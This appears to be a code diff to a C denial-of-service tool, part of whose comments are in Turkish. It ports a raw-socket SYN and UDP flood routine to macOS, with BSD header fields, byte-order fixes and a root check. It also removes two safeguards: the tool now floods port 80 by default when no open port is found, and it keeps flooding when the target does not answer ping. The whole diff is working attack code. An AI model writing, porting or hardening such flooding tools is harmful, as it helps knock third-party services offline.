@@ -44,10 +44,41 @@ struct pseudo_header {
     uint16_t tcp_length;
 };
 
-/* Compile-time sanity check: the kernel expects exactly 20 bytes and its
- * own bitfield ordering for the version/ihl pair.  Using glibc's struct
- * iphdr (rather than a hand-rolled one) guarantees that layout matches. */
-_Static_assert(sizeof(struct iphdr) == 20, "struct iphdr layout mismatch");
+#if defined(__APPLE__)
+/* macOS exposes BSD's struct ip, not Linux's struct iphdr.  Keep the
+ * Linux-style field names used by this legacy packet builder local to the
+ * implementation so the header is complete when taking its address. */
+struct nero_iphdr {
+    uint8_t ihl:4;
+    uint8_t version:4;
+    uint8_t tos;
+    uint16_t tot_len;
+    uint16_t id;
+    uint16_t frag_off;
+    uint8_t ttl;
+    uint8_t protocol;
+    uint16_t check;
+    uint32_t saddr;
+    uint32_t daddr;
+};
+#else
+/* Linux keeps the kernel header's exact layout and endianness handling. */
+#define nero_iphdr iphdr
+#endif
+
+/* Compile-time sanity check: the kernel expects exactly 20 bytes for IPv4. */
+_Static_assert(sizeof(struct nero_iphdr) == 20, "struct iphdr layout mismatch");
+
+/* Darwin's IP_HDRINCL expects ip_len and ip_off in host byte order, while
+ * glibc expects network byte order.  These helpers keep both call sites and
+ * the IPv4 checksum (which is always computed over wire-format bytes) correct. */
+#if defined(__APPLE__)
+#define NERO_IP_LEN_SET(iph, value) ((iph)->tot_len = (uint16_t)(value))
+#define NERO_IP_LEN_GET(iph) ((int)(iph)->tot_len)
+#else
+#define NERO_IP_LEN_SET(iph, value) ((iph)->tot_len = htons((uint16_t)(value)))
+#define NERO_IP_LEN_GET(iph) ((int)ntohs((iph)->tot_len))
+#endif
 
 typedef struct {
     const char *target_ip;
@@ -124,6 +155,20 @@ static unsigned short checksum(unsigned short *ptr, int nbytes) {
     return answer;
 }
 
+/* IPv4 checksum must be computed over the wire representation of the header.
+ * On Darwin tot_len is stored in host order, so swap it temporarily. */
+static unsigned short ip_checksum(struct nero_iphdr *iph) {
+#if defined(__APPLE__)
+    uint16_t saved = iph->tot_len;
+    iph->tot_len = htons(saved);
+    unsigned short result = checksum((unsigned short *)iph, iph->ihl * 4);
+    iph->tot_len = saved;
+    return result;
+#else
+    return checksum((unsigned short *)iph, iph->ihl * 4);
+#endif
+}
+
 int is_target_online(const char *ip) {
     // Reject anything that is not a dotted-quad IPv4 before shelling out:
     // the ping command below is passed to /bin/sh, so unvalidated input
@@ -133,9 +178,14 @@ int is_target_online(const char *ip) {
         return 0;
 
     char command[128];
-    // -c 1: send one packet; -W 1: one-second timeout on Linux
+#if defined(__APPLE__)
+    /* Darwin interprets -W as milliseconds; Linux interprets it as seconds. */
+    int written = snprintf(command, sizeof(command),
+                           "ping -c 1 -W 1000 %s > /dev/null 2>&1", ip);
+#else
     int written = snprintf(command, sizeof(command),
                            "ping -c 1 -W 1 %s > /dev/null 2>&1", ip);
+#endif
     if (written < 0 || (size_t)written >= sizeof(command))
         return 0;
 
@@ -160,6 +210,9 @@ static void *flood(void *arg)
     struct sockaddr_in sin;
     memset(&sin, 0, sizeof(sin));
     sin.sin_family = AF_INET;
+#if defined(__APPLE__)
+    sin.sin_len = sizeof(sin);
+#endif
     sin.sin_port = htons(port_select);
     sin.sin_addr.s_addr = inet_addr(target_ip);
 
@@ -200,14 +253,14 @@ static void *flood(void *arg)
 
         /* ---------------- TCP ---------------- */
         memset(datagram, 0, PACKET_SIZE);
-        struct iphdr *iph = (struct iphdr *)datagram;
-        struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
+        struct nero_iphdr *iph = (struct nero_iphdr *)datagram;
+        struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct nero_iphdr));
 
         /* 1) IP başlığı */
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
-        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
+        NERO_IP_LEN_SET(iph, sizeof(struct nero_iphdr) + sizeof(struct tcphdr));
         iph->id = htons(rand_r(&seed) % 65535);
         iph->frag_off = 0;
         iph->ttl = 255;
@@ -217,6 +270,19 @@ static void *flood(void *arg)
         iph->check = 0;
 
         /* 2) TCP başlığı */
+#if defined(__APPLE__)
+        /* macOS (BSD): alan adları th_* önekli.  SYN ayrı bit değil,
+         * th_flags içinde TH_SYN bayrağıdır. */
+        tcph->th_sport = htons(rand_r(&seed) % 65535);
+        tcph->th_dport = htons(port_select);
+        tcph->th_seq   = rand_r(&seed);
+        tcph->th_ack   = 0;
+        tcph->th_off   = 5;
+        tcph->th_flags = TH_SYN;
+        tcph->th_win   = htons(32767 + rand_r(&seed) % (65536 - 32767));
+        tcph->th_sum   = 0;
+        tcph->th_urp   = 0;
+#else
         tcph->source  = htons(rand_r(&seed) % 65535);
         tcph->dest    = htons(port_select);
         tcph->seq     = rand_r(&seed);
@@ -226,9 +292,10 @@ static void *flood(void *arg)
         tcph->window  = htons(32767 + rand_r(&seed) % (65536 - 32767));
         tcph->check   = 0;
         tcph->urg_ptr = 0;
+#endif
 
         /* 3) IP checksum — SADECE 20 byte (ihl * 4) */
-        iph->check = checksum((unsigned short *)datagram, iph->ihl * 4);
+        iph->check = ip_checksum(iph);
 
         /* 4) TCP checksum — pseudo-header + TCP başlığı */
         struct pseudo_header psh_tcp;
@@ -247,10 +314,14 @@ static void *flood(void *arg)
         }
         memcpy(pseudogram_tcp, &psh_tcp, sizeof(struct pseudo_header));
         memcpy(pseudogram_tcp + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
+#if defined(__APPLE__)
+        tcph->th_sum = checksum((unsigned short *)pseudogram_tcp, psize_tcp);
+#else
         tcph->check = checksum((unsigned short *)pseudogram_tcp, psize_tcp);
+#endif
         free(pseudogram_tcp);
 
-        if (sendto(sock_tcp, datagram, ntohs(iph->tot_len), 0,
+        if (sendto(sock_tcp, datagram, NERO_IP_LEN_GET(iph), 0,
                    (struct sockaddr *)&sin, sizeof(sin)) < 0) {
             if (tcp_err == 0) perror("sendto tcp");
             tcp_err++;
@@ -260,11 +331,11 @@ static void *flood(void *arg)
 
         /* ---------------- UDP ---------------- */
         memset(datagram, 0, PACKET_SIZE);
-        iph = (struct iphdr *)datagram;
-        struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
+        iph = (struct nero_iphdr *)datagram;
+        struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct nero_iphdr));
 
         int payload_len = (rand_r(&seed) % 480) + 32;
-        char *payload = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
+        char *payload = datagram + sizeof(struct nero_iphdr) + sizeof(struct udphdr);
         for (int i = 0; i < payload_len; i++) {
             payload[i] = (char)(rand_r(&seed) % 256);
         }
@@ -273,7 +344,7 @@ static void *flood(void *arg)
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
-        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len);
+        NERO_IP_LEN_SET(iph, sizeof(struct nero_iphdr) + sizeof(struct udphdr) + payload_len);
         iph->id = htons(rand_r(&seed) % 65535);
         iph->frag_off = 0;
         iph->ttl = 255;
@@ -283,13 +354,21 @@ static void *flood(void *arg)
         iph->check = 0;
 
         /* 2) UDP başlığı (payload zaten yazıldı) */
+#if defined(__APPLE__)
+        /* macOS (BSD): alan adları uh_* önekli. */
+        udph->uh_sport = htons(rand_r(&seed) % 65535);
+        udph->uh_dport = htons(port_select);
+        udph->uh_ulen  = htons(sizeof(struct udphdr) + payload_len);
+        udph->uh_sum   = 0;
+#else
         udph->source = htons(rand_r(&seed) % 65535);
         udph->dest   = htons(port_select);
         udph->len    = htons(sizeof(struct udphdr) + payload_len);
         udph->check  = 0;
+#endif
 
         /* 3) IP checksum — SADECE 20 byte */
-        iph->check = checksum((unsigned short *)datagram, iph->ihl * 4);
+        iph->check = ip_checksum(iph);
 
         /* 4) UDP checksum — pseudo-header + UDP başlığı + payload */
         struct pseudo_header psh_udp;
@@ -309,10 +388,14 @@ static void *flood(void *arg)
         memcpy(pseudogram_udp, &psh_udp, sizeof(struct pseudo_header));
         memcpy(pseudogram_udp + sizeof(struct pseudo_header), udph,
                sizeof(struct udphdr) + payload_len);
+#if defined(__APPLE__)
+        udph->uh_sum = checksum((unsigned short *)pseudogram_udp, psize_udp);
+#else
         udph->check = checksum((unsigned short *)pseudogram_udp, psize_udp);
+#endif
         free(pseudogram_udp);
 
-        if (sendto(sock_udp, datagram, ntohs(iph->tot_len), 0,
+        if (sendto(sock_udp, datagram, NERO_IP_LEN_GET(iph), 0,
                    (struct sockaddr *)&sin, sizeof(sin)) < 0) {
             if (udp_err == 0) perror("sendto udp");
             udp_err++;
@@ -377,8 +460,14 @@ int port_get(const char *target_ip){
         return -1;
     }
     if (selected == 0) {
-        fprintf(stderr, "\n\033[49m[!]\033[0m\033[1;31m No open port found on %s.\033[0m\n", target_ip);
-        return -1;
+        /* Keep packet transmission available even when the discovery scan
+         * finds no listening port: fall back to the standard HTTP port. */
+        port_select = 80;
+        fprintf(stderr,
+                "\n\033[49m[!]\033[0m\033[1;31m No open port found on %s; "
+                "flooding default port 80.\033[0m\n",
+                target_ip);
+        return 0;
     }
     port_select = selected;
     return 0;
@@ -400,6 +489,18 @@ int SYN_Flood(const char *target_ip) {
         }
     }
 
+#if defined(__APPLE__)
+    /* Raw IPv4 sockets require root on macOS.  Report the requirement before
+     * starting any worker so the failure is actionable instead of a per-thread
+     * "Operation not permitted". */
+    if (geteuid() != 0) {
+        fprintf(stderr,
+                "\n\033[49m[!]\033[0m\033[1;31m Raw packet sockets require "
+                "root on macOS: run with sudo.\033[0m\n");
+        return 1;
+    }
+#endif
+
     if (port_get(target_ip) != 0)
         return 1;
 
@@ -409,9 +510,13 @@ int SYN_Flood(const char *target_ip) {
     sigemptyset(&sa.sa_mask);
     sa.sa_flags = 0;
 
+    /* Reachability is advisory: ICMP may be filtered even when the target is
+     * up, so never block packet transmission because of it. */
     if (!is_target_online(target_ip)) {
-        fprintf(stderr, "\n\033[49m[!]\033[0m\033[1;31m Target %s is unreachable! (ping failed)\033[0m\n", target_ip);
-        return 1;
+        fprintf(stderr,
+                "\n\033[49m[!]\033[0m\033[1;33m Target %s did not answer "
+                "ping; continuing anyway.\033[0m\n",
+                target_ip);
     }
 
     if (sigaction(SIGINT, &sa, NULL) == -1) {
